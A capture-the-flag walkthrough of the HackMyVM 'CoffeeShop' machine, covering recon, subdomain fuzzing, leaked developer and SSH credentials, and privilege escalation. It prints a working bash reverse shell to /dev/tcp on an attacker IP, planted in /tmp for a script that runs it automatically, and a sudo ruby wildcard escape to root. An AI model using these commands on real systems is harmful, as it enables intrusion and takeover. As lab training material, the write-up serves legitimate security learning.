<h1 align="center"> CoffeeShop-HMV: <a href="https://hackmyvm.eu/machines/machine.php?vm=CoffeeShop">CoffeeShop</a></h1/>


## Net Discover & NMAP
First thinks first

 ```zsh
┌──(cool㉿kali-i7)-[~/HMV]
└─$ sudo netdiscover -i eth1 -r 10.100.100.0/24
```
```
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                 
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.100.100.17   08:00:27:50:f2:b7      1      60  PCS Systemtechnik GmbH
 ```
 ```zsh
┌──(cool㉿kali-i7)-[~/HMV]
└─$ ip=10.100.100.17
```
```zsh
──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ nmap -v -T5 -p- -sC -sV -oN nmap-$ip.log $ip; clear; cat nmap-$ip.log
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-23 12:35 EET
...
# Nmap 7.94SVN scan initiated Sat Mar 23 12:35:41 2024 as: nmap -v -T5 -p- -sC -sV -oN nmap-10.100.100.17.log 10.100.100.17
Nmap scan report for dev.midnight.coffee (10.100.100.17)
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 81:a4:52:2b:14:3f:13:68:2b:e2:5b:c4:7b:d7:1a:a5 (ECDSA)
|_  256 25:19:09:29:2f:b8:ea:b4:29:1f:6d:e7:13:d6:be:7e (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Login Information - Midnight Coffee
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 ```
## Visiting the website 
```zsh
┌──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ curl $ip
.....
 <body>
    <header>
        <h1>Midnight Coffee</h1>
    </header>

    <section>
        <h2 id="under-construction">Our website "midnight.coffee" is under Construction</h2>
        <p>We're brewing something new for you. Stay tuned!</p>
    </section>

    <footer>
        <p>&copy; 2024 Midnight Coffee. All rights reserved.</p>
    </footer>
</body>

```
Domain found : midnight.coffee 

```zsh
┌──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ echo '10.100.100.17 midnight.coffee' | sudo tee -a /etc/hosts
10.1000.100.17 midnight.coffee
```

## Feroxbuster
 ```zsh
 ┌──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://midnight.coffee -t 500 -o scans/ferox-$ip.log
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://midnight.coffee
 🚀  Threads               │ 500
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ scans/ferox-10.100.100.17.log
 💲  Extensions            │ [txt, php, html, zip, htm, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      317c http://midnight.coffee/shop => http://midnight.coffee/shop/
200      GET       69l      152w     1690c http://midnight.coffee/index.html
200      GET       69l      152w     1690c http://midnight.coffee/

```

```zsh
┌──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ curl http://midnight.coffee/shop/
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="stylesheet/styles.css">
    <title>Midnight Coffee</title>
</head>
<body>
    <header>
        <h1>Midnight Coffee</h1>
        <nav>
            <ul>
                <li><a href="#menu">Menu</a></li>
                <li><a href="#location">Location</a></li>
                <li><a href="#contact">Contact</a></li>
                <li><a href="login.php">Login</a></li>
            </ul>
        </nav>
    </header>
```
```zsh
┌──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ curl curl http://midnight.coffee/shop/login.php

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="stylesheet/styles.css">
    <title>Login - Midnight Coffee</title>
</head>
<body>
    <header>
        <h1>Midnight Coffee</h1>
        <nav>
            <ul>
                <li><a href="#menu">Menu</a></li>
                <li><a href="#location">Location</a></li>
                <li><a href="#contact">Contact</a></li>
                <!-- Add a link back to the home page -->
                <li><a href="index.html">Home</a></li>
            </ul>
        </nav>
    </header>

    <section id="login-form">
        <h2>Login</h2>
        
        <form method="post" action="">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <input type="submit" value="Login">
        </form>
    </section>

    <footer>
        <p>&copy; 2024 Midnight Coffee. All rights reserved.</p>
    </footer>
</body>
</html>
```
## Subdomains Fuzzing
Lets see if this domain have any subdomains 
```zsh
┌──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -Z --sc 200,202,204,302,307,403  http://FUZZ.midnight.coffee
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://FUZZ.midnight.coffee/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000001:   302        0 L      5 W        88 Ch       "www"                                                                                                                                                                      
000000019:   200        71 L     152 W      1738 Ch     "dev"       
```

 ```zsh
┌──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ echo '10.100.100.17 dev.midnight.coffee' | sudo tee -a /etc/hosts
10.100.100.17 dev.midnight.coffee
```

```zsh
┌──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ curl http://dev.midnight.coffee/
<!DOCTYPE html>
<html lang="en">
<head>
....
<body>
    <header>
        <h1>Midnight Coffee</h1>
    </header>

    <section>
        <h2 id="login-message">Developer Login Information</h2>
        <p>Developers can log in with the credentials:</p>
        <p>Username: <strong>developer</strong></p>
        <p>Password: <strong>developer</strong></p>
    </section>

    <footer>
        <p>&copy; 2024 Midnight Coffee. All rights reserved.</p>
    </footer>
</body>
</html>
```
## Credentials
Creds: developer developer
Use the creds found earlier to login to the following url:
```zsh
┌──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ firefox http://midnight.coffee/shop/login.php &
```
## Shell Credentials
We found the username and password
Tuna : 1L0v3_TuN4_Very_Much

```zsh
┌──(cool㉿kali-i7)-[~/HMV/coffeeshop]
└─$ ssh tuna@$ip                               
tuna@10.100.100.17's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
...
tuna@coffee-shop:~$ sudo -l
[sudo] password for tuna: 
Sorry, user tuna may not run sudo on coffee-shop.
tuna@coffee-shop:~$ history 
    1  ls
    2  touch coffee_list.txt
    3  vim coffee_list.txt 
    4  head coffee_list.txt 
...
   75  cat /home/shopadmin/
   76  cat /home/shopadmin/execute.sh
   77  exit
   78  cat /home/shopadmin/execute.sh
   79  exit
   80  cat /home/shopadmin/execute.sh
```
Lets see whats that execute is

```zsh
tuna@coffee-shop:~$ cat /home/shopadmin/execute.sh
#!/bin/bash

/bin/bash /tmp/*.sh
```

## Reverse Shell
On a new terminal on our pc :
```zsh
┌──(cool㉿kali-i7)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
```
Back to the shell
```zsh
tuna@coffee-shop:/tmp$ echo '/bin/bash -i >& /dev/tcp/10.100.100.1/9001 0>&1' > cool.sh && chmod +x cool.sh && cat cool.sh
/bin/bash -i >& /dev/tcp/10.100.100.1/9001 0>&1
```
## User Flag
Back to the listener
```zsh
┌──(cool㉿kali-i7)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...

connect to [10.100.100.1] from (UNKNOWN) [10.100.100.17] 55258
bash: cannot set terminal process group (1084): Inappropriate ioctl for device
bash: no job control in this shell
shopadmin@coffee-shop:~$ 
shopadmin@coffee-shop:~$ id
id
uid=1001(shopadmin) gid=1001(shopadmin) groups=1001(shopadmin)
shopadmin@coffee-shop:~$ ls
execute.sh
user.txt
```
```zsh
shopadmin@coffee-shop:~$ sudo -l
sudo -l
Matching Defaults entries for shopadmin on coffee-shop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User shopadmin may run the following commands on coffee-shop:
    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb
```

## Exploiting and root flag
Interesting 
Since we have that * we can add anything we like

```zsh
shopadmin@coffee-shop:~$ sudo /usr/bin/ruby -e 'exec "/bin/bash"' /opt/shop.rb
<do /usr/bin/ruby -e 'exec "/bin/bash"' /opt/shop.rb

id
uid=0(root) gid=0(root) groups=0(root)
pwd
/home/shopadmin
cd /root
ls
root.txt
snap
```
